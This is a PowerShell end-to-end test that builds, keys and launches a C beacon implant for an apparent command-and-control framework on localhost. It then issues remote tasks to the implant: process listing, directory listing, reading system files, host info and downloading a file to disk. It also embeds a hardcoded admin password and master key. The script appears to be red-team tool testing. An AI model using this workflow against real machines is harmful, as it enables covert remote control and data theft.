# e2e-c-implant.ps1 - one-click C implant E2E vs scratch server (8001):
# mint secret -> unseal -> build -> seed seq -> launch -> issue ps/ls/read/hostinfo/download_url -> verify
$ErrorActionPreference = "Stop"
$base = "http://127.0.0.1:8001"
$repo = "C:\Users\18354\Downloads\C2\forgec2"
$tmp = "C:\Users\18354\AppData\Local\Temp\opencode\cbe2e"
$db = "$tmp\data\db\forgec2.db"
$master = "5dd4e19cbf285aa8d53966945ef835c38e3990e1398915b9bc1ee071df4db223"
Stop-Process -Name cbeacon-e2e -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
$sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-RestMethod -Method Post -Uri "$base/api/login" -WebSession $sess -Headers @{'Accept'='application/json'} -ContentType 'application/x-www-form-urlencoded' -Body 'username=admin&password=T3st-C-Pr0t0!' | Out-Null
$csrf = ($sess.Cookies.GetCookies($base) | Where-Object { $_.Name -eq 'forgec2_csrf' }).Value
$H = @{'Accept'='application/json'; 'X-CSRF-Token'=$csrf}
# mint one-liner (creates fresh reg_secret row)
Invoke-RestMethod -Method Post -Uri "$base/generate/one-liner" -WebSession $sess -Headers $H -ContentType 'application/x-www-form-urlencoded' -Body 'payload_type=ps1&listener_id=1' | Out-Null
Write-Host "one-liner ok (fresh secret minted)"
Push-Location $repo
try { $row = (& go run ./cmd/dbq $db 'SELECT id, secret_enc FROM reg_secrets ORDER BY rowid DESC LIMIT 1' 2>$null) | Select-Object -First 1 } finally { Pop-Location }
$id = ($row -split ' ')[0].Split('=')[1]
$enc = ($row -split 'secret_enc=')[1].Trim()
Write-Host "secret id=$id"
Push-Location "C:\Users\18354\AppData\Local\Temp\opencode\unseal"
try { $b64 = (& go run . $master $enc 2>$null) | Select-Object -First 1 } finally { Pop-Location }
Write-Host "secret unsealed len=$($b64.Length)"
$bat = '@echo off' + "`r`n" + 'x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-e2e.exe beacon.c crypto_cng.c curve25519.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8001 -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"' + $id + '\" -DSECRET_B64=\"' + $b64 + '\" -DINTERVAL=3 -DE2E_DEBUG'
Set-Content -Path "$repo\proto\c-implant\build-e2e.bat" -Value $bat
Push-Location "$repo\proto\c-implant"
try {
  # mingw pragma warnings go to stderr: keep them in the log without
  # tripping $ErrorActionPreference=Stop (same pattern as build-embedded).
  $prevEAP = $ErrorActionPreference
  $ErrorActionPreference = "Continue"
  cmd /c build-e2e.bat > "$tmp\build.log" 2>&1
  $ErrorActionPreference = $prevEAP
} finally { Pop-Location }
if (-not (Test-Path "$repo\proto\c-implant\cbeacon-e2e.exe")) { throw "build produced no binary, see $tmp\build.log" }
Write-Host "build ok"
# seed seq from server last_seq to avoid replay on restart
try { $agents = Invoke-RestMethod -Uri "$base/api/agents" -WebSession $sess -Headers @{'Accept'='application/json'}; Write-Host "agents listed" } catch { Write-Host "agent list skip: $($_.Exception.Message)" }
Remove-Item $env:TEMP\fc2c.dat -Force -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\fc2c.seq -Force -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\cbeacon-dbg.log -Force -ErrorAction SilentlyContinue
Start-Process -FilePath "$repo\proto\c-implant\cbeacon-e2e.exe" -WorkingDirectory "$repo\proto\c-implant"
Write-Host "launched, waiting 12s for handshake..."
Start-Sleep -Seconds 12
# issue 5 tasks (resolve live agent: fresh identity => new UUID each run)
$agent = ""
Push-Location $repo
try { $agent = (& go run ./cmd/dbq $db 'SELECT id FROM implants ORDER BY last_seen DESC LIMIT 1' 2>$null) | Select-Object -First 1 } finally { Pop-Location }
$agent = ($agent -split ' ')[0].Split('=')[1].Trim()
if (-not $agent) { throw "no agents registered" }
Write-Host "target agent=$agent"
function Issue($path, $form) { (Invoke-RestMethod -Method Post -Uri "$base$path" -WebSession $sess -Headers $H -Body $form) | ConvertTo-Json -Depth 4 -Compress }
Write-Host (Issue "/agents/$agent/ps" @{})
Write-Host (Issue "/agents/$agent/files/ls" @{path='C:\Windows'})
Write-Host (Issue "/agents/$agent/files/read" @{path='C:\Windows\System32\drivers\etc\hosts'})
Write-Host (Issue "/agents/$agent/hostinfo" @{category='system'})
Write-Host (Issue "/agents/$agent/download_url" @{url='http://127.0.0.1:8001/health'; dest='C:\Windows\Temp\fc2c-dl-test.txt'})
Write-Host "tasks issued, waiting 20s..."
Start-Sleep -Seconds 20
$tasks = Invoke-RestMethod -Uri "$base/agents/$agent/tasks" -WebSession $sess -Headers @{'Accept'='application/json'}
foreach ($t in $tasks.data.tasks) { Write-Host ("TASK {0} type={1} status={2} len={3} err=[{4}]" -f $t.id, $t.type, $t.status, $t.result.Length, $t.error) }
Write-Host "E2E done. ls (silent type) verify via: go run ./dump_task_tmp $db <lootkey> <id>"
# Scrub the minted per-implant secret: the tracked build file keeps placeholders only.
Set-Content -Path "$repo\proto\c-implant\build-e2e.bat" -Value ('@echo off' + "`r`n" + 'x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-e2e.exe beacon.c crypto_cng.c curve25519.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8001 -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"YOUR_SECRET_ID\" -DSECRET_B64=\"YOUR_SECRET_B64\" -DINTERVAL=3 -DE2E_DEBUG')
